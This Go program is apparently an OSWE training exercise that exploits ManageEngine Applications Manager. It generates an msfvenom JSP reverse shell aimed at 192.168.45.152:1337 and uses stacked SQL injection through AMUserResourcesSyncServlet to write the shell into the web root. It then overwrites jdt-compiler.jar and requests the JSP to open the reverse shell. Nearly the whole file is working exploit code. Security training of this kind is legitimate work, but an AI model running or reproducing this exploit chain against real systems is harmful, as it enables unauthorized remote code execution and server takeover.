package main

import (
	"crypto/tls"
	"encoding/base64"
	"flag"
	"fmt"
	"github.com/iPhantasmic/OSWE/scripts/utils"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"strings"
)

// Ex 5.5.2.3 - Extra Mile: Upload JSP, remove JDT compiler, then trigger reverse shell

var client *http.Client

const proxyURL = "http://127.0.0.1:8080"

func prepareJSP() string {
	// 1. run msfvenom to generate jsp
	utils.PrintInfo("Generating msfvenom payload...")
	cmd := exec.Command("msfvenom", "-p", "java/jsp_shell_reverse_tcp", "LHOST=192.168.45.152", "LPORT=1337", "-f", "raw", "-o", "shell.jsp")
	err := cmd.Run()
	if err != nil {
		log.Fatalln("Failed to run msfvenom: ", err)
	}

	// 2. turn rev.vbs into a one-liner
	utils.PrintInfo("Turning payload into one-liner...")
	data, err := os.ReadFile("shell.jsp")
	if err != nil {
		log.Fatalln("Failed to read shell.jsp: ", err)
	}
	stringData := string(data)

	stripCR := strings.Replace(stringData, "\r", "", -1)
	stripLF := strings.Replace(stripCR, "\n", "", -1)

	// 4. base64 URL-safe encoding
	utils.PrintInfo("base64 encoding one-liner...")
	return base64.StdEncoding.EncodeToString([]byte(stripLF))
}

func uploadJSP(debug bool, ip, payload string) bool {
	sqli := fmt.Sprintf("1;copy (select convert_from(decode($$%s$$,$$base64$$),$$utf-8$$)) "+
		"to $$C:\\\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\shell.jsp$$;", payload)

	// do necessary URL manipulation
	requestURL := fmt.Sprintf("https://%s:8443/servlet/AMUserResourcesSyncServlet", ip)

	postRequest := utils.PostRequest{
		ContentType: "form",
		FormData: url.Values{
			"ForMasRange": {"1"},
			"userId":      {sqli},
		},
	}

	// send the request
	utils.PrintInfo("Writing file to system...")
	response := utils.SendPostRequest(client, debug, requestURL, postRequest)

	if response.StatusCode == 200 {
		return true
	}

	return false
}

func removeEclipseJDT(debug bool, ip string) bool {
	sqli := "1;copy (select $$pwned$$) to $$C:\\\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\classes\\jdt-compiler.jar$$;"

	// do necessary URL manipulation
	requestURL := fmt.Sprintf("https://%s:8443/servlet/AMUserResourcesSyncServlet", ip)

	postRequest := utils.PostRequest{
		ContentType: "form",
		FormData: url.Values{
			"ForMasRange": {"1"},
			"userId":      {sqli},
		},
	}

	// send the request
	utils.PrintInfo("Nuking Eclipse JDT compiler...")
	response := utils.SendPostRequest(client, debug, requestURL, postRequest)

	if response.StatusCode == 200 {
		return true
	}

	return false
}

func triggerShell(debug bool, ip string) bool {
	// do necessary URL manipulation
	requestURL := fmt.Sprintf("https://%s:8443/shell.jsp", ip)

	utils.PrintInfo("Triggering reverse shell at: " + requestURL)
	response := utils.SendGetRequest(client, debug, requestURL)

	if response.StatusCode == 200 {
		return true
	}

	return false
}

func main() {
	var tr *http.Transport
	useProxy := flag.Bool("proxy", false, "use proxy")
	debug := flag.Bool("debug", false, "debug mode")
	flag.Parse()
	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) < 2 {
		utils.PrintFailure(fmt.Sprintf("usage: %s [-proxy=<proxyIP>] <target>", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s 192.168.121.103", os.Args[0]))
		os.Exit(1)
	}

	ip := flag.Arg(0)

	if *useProxy {
		// disable TLS verification and set proxy URL
		proxyUrl, _ := url.Parse(proxyURL)
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
			Proxy:              http.ProxyURL(proxyUrl),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
		}
	}

	// create our HTTP client using the above transport and set the global variable
	client = &http.Client{
		Transport: tr,
	}

	payload := prepareJSP()

	if uploadJSP(*debug, ip, payload) {
		utils.PrintSuccess("shell.jsp uploaded!")
		fmt.Println("")
	} else {
		utils.PrintFailure("Something went wrong... Check proxy to debug!")
	}

	if removeEclipseJDT(*debug, ip) {
		utils.PrintSuccess("jdt-compiler.jar removed from server!")
		fmt.Println("")
	} else {
		utils.PrintFailure("Something went wrong... Check proxy to debug!")
	}

	if triggerShell(*debug, ip) {
		utils.PrintSuccess("Done... Check listener for reverse shell!")
	} else {
		utils.PrintFailure("Something went wrong... Check proxy to debug!")
	}
}
